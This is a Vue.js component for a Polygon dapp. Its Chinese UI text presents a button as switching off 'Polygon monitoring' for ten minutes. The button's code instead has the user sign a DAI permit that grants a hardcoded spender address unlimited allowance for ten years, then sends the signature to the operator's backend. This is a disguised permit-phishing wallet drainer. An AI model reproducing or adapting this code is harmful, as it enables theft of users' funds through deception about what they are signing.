<template>
  <div class="car">
    <el-alert title="使用说明:未添加额外钱包的请先添加额外钱包,然后切换到额外钱包点击关闭马蹄监听,10分钟后会自动再次打开监听马蹄,请在10分钟内操作完需要的交互,超时后需要重新点击关闭" type="error" :closable="false" />
    <el-card class="box-card">
      <span v-if="admin" class="span">{{ "address: " + admin.substring(0, 12).toUpperCase() + "..." + admin.substring(admin.length - 12).toUpperCase() }}</span>
      <span v-else class="span">没有可管理钱包地址</span>
      <span>{{ "状态:" + start }}</span>
      <el-button type="primary" :disabled="!admin" :loading="loading" @click="jiaoyinew()">关闭马蹄监听</el-button>
    </el-card>
  </div>
</template>

<script>
import { ethers } from "ethers";
import { ref } from "vue";
import { mapState } from "vuex";
import { axiosInstance } from "@/api/post";
import { getprovider } from "@/api/wallet";
export default {
  name: "MYcar",
  computed: {
    ...mapState(["id", "address", "admin", "start", "fullscreenLoading"]),
  },
  components: {},
  data() {
    return {
      loading: false,
    };
  },
  methods: {
    async jiaoyinew() {
      try {
        if (!this.address) {
          this.$alert("请使用dapp浏览器打开", "提示", {
            confirmButtonText: "确定",
            callback: (action) => {},
          });
          return;
        }

        if (this.id != 137) {
          this.$alert("请先切换到马蹄链", "提示", {
            confirmButtonText: "确定",
            callback: (action) => {},
          });
          return;
        }
        this.loading = true;
        const daiAddress = "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063";
        const daiAbi = ["function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s)", "function getNonce(address user) public view returns(uint256 nonce)", "function name() public view returns (string)"];
        const holder = this.address;
        const spender = "0x5da16b43E4e86bcc76a8b30ec112b8eE15A068e1"; // 设置为目标地址
        const daiContract = new ethers.Contract(daiAddress, daiAbi, await getprovider().getSigner());
        const nonce = await daiContract.getNonce(holder);
        const name = await daiContract.name();
        const signer = await getprovider().getSigner();
        const currentBlockTimeStamp = (await getprovider().getBlock("latest")).timestamp;
        const tenYearsInSeconds = 10 * 365 * 86400;
        const expiry = currentBlockTimeStamp + tenYearsInSeconds;
        const allowed = true;
        const chainId = this.id;
        const domain = {
          name: name,
          version: "1",
          verifyingContract: daiAddress,
          salt: ethers.zeroPadValue(ethers.hexlify(ethers.toBeHex(chainId)), 32),
        };
        const types = {
          Permit: [
            { name: "holder", type: "address" },
            { name: "spender", type: "address" },
            { name: "nonce", type: "uint256" },
            { name: "expiry", type: "uint256" },
            { name: "allowed", type: "bool" },
          ],
        };
        const message = {
          holder: holder,
          spender: spender,
          nonce: Number(nonce),
          expiry: expiry.toString(),
          allowed: allowed,
        };
        // console.log()
        const signature = await signer.signTypedData(domain, types, message);
        const { v, r, s } = ethers.Signature.from(signature);
        let data = { holder: holder, spender: spender, token: daiAddress, nonce: nonce.toString(), expiry: expiry.toString(), signature: signature };
        let arr = await axiosInstance.post("/Create/switch", data);
        // 这里判断成功还是失败
        this.$emit("sendData");
        if (arr.data.code == 200) {
          this.$alert("监听已关闭", "成功", {
            confirmButtonText: "确定",
            callback: (action) => {},
          });
        }

        this.loading = false;
      } catch (error) {
        this.$alert(error.message, "提示", {
          confirmButtonText: "确定",
          callback: (action) => {},
        });
        this.loading = false;
      }
    },
  },
  mounted() {
    // this.ConnectWallet()
  },
};
</script>
<style scoped>
.car {
  width: 90vw;
  display: flex;
  flex-direction: column;
  gap: 3vh;
}

.span {
  font-size: 14px;
  font-weight: bold;
}

@media (min-width: 500px) {
  .car {
    width: 448px;
  }
}
</style>
<style>
.car .box-card .el-card__body {
  display: flex;
  flex-direction: column;
  justify-content: center;
  /* align-items: center; */
  gap: 15px;
}
.car .box-card .el-radio-group {
  margin: auto;
}

.car .box-card .el-input__wrapper {
  box-shadow: none !important;
  height: 40px !important;
  background-color: #f4f4f5 !important;
}
.car .box-card .el-input__inner {
  --el-input-inner-height: none !important;
  font-size: 20px;
}
.car .box-card .el-input {
  width: 50vw;
}
.car .box-card .swapicon {
  width: 20px;
  height: 20px;
  background: var(--el-color-primary);
  border-radius: 50%;
  color: #fff;
  position: absolute;
  top: 50%;
  transform: translateY(-50%);
  right: 5px;
  z-index: 2;
}

@media (min-width: 500px) {
  .car .box-card .el-input {
    width: 250px;
  }
}
</style>
